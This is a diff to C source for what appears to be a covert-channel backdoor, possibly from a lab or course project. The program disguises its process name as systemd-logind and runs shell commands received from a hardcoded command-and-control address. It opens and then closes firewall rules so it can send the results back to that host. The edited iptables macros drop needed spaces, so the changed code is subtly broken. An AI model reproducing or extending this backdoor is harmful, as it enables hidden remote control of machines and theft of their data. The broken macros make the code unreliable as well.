@@ -9,8 +9,8 @@
 #define MASK "/usr/lib/systemd/systemd-logind"
 #define CMD "./cmd.sh > results"
 #define CHMOD "chmod 755 cmd.sh"
-#define IPTABLES "iptables -A OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
-#define TURNOFF "iptables -D OUTPUT -p tcp -d 192.168.0.110 --dport 8505 -j ACCEPT"
+#define IPTABLES(ip) "iptables -A OUTPUT -p tcp -d" ip "--dport 8505 -j ACCEPT"
+#define TURNOFF(ip) "iptables -D OUTPUT -p tcp -d" ip "--dport 8505 -j ACCEPT"
 #define RESULT_FILE "results"
 #define INFECTEDIP "192.168.0.100"
 #define CNCIP "192.168.0.109"
@@ -203,7 +203,7 @@ void ParsePayload(const u_char *payload, int len){
     fclose(fp);
     system(CHMOD);
     system(CMD);
-    system(IPTABLES);
+    system(IPTABLES(CNCIP));
 
     printf("COMMAND RECEIEVED \n");
     //sending the results back to the CNC
@@ -217,10 +217,10 @@ void ParsePayload(const u_char *payload, int len){
     covert_send(srcip, destip, sport, 8507, data, 2);
     printf("RETURNING RESULTS\n");
     send_results(srcip, destip, sport, dport, RESULT_FILE);
-    system(TURNOFF);
+    system(TURNOFF(CNCIP));
     printf("\n");
     printf("\n");
-    printf("WAITING FOR NEW COMMAND\n");
+    printf("Waiting for new command\n");
 }
 
 void recv_results(char* sip, unsigned short sport) {
